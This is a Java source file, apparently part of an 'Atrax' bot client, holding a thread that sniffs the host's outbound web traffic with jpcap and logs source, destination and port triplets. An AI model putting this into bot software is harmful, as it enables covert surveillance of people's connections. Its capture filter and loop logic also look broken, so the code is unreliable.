
package Atrax.atrax_client_bot;

import java.io.IOException;
import java.util.HashSet;
import java.util.Set;

// packet capture library
import jpcap.JpcapCaptor;
import jpcap.NetworkInterface;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
/****************************************
 * @author sindat
 * this class:
 * makes the bot on the host listen to
 * to/from TCP connections on the host
 ****************************************/
class theListener extends Thread {
    Set<String> connectionTriplets = new HashSet<>();
    boolean pleaseWait = false;
    
    @Override
    public void run() {
        while (true) {
            // if the wait request has been received
            synchronized(this) {
                while (pleaseWait) {
                    try {
                        wait();
                    } catch (Exception e) {
                      }
                }
            }
            // if a wait request is not passed in:
            // start scanning the host interface
            // and determine the tcp triplets - source IP, dest IP, dest port
            try {
                NetworkInterface[] devices = JpcapCaptor.getDeviceList();
                JpcapCaptor theCaptor;
                theCaptor = JpcapCaptor.openDevice(devices[2], 65535, false, 20);
                theCaptor.setFilter("tcp + destport=80 || destport=443", true);
                while (true) {
                    Packet theCapturedPacket = theCaptor.getPacket();
                    if (theCapturedPacket != null) {
                        final TCPPacket tcpPacket = (TCPPacket)theCapturedPacket;
                        
                        connectionTriplets.add(" (" + tcpPacket.src_ip.toString().replace("/", "") + ", "
                        + tcpPacket.dst_ip.toString().replace("/", "") + ", " + tcpPacket.dst_port + ") ");
                    }
                }
            } catch(IOException e){
            }
        }
    }
}
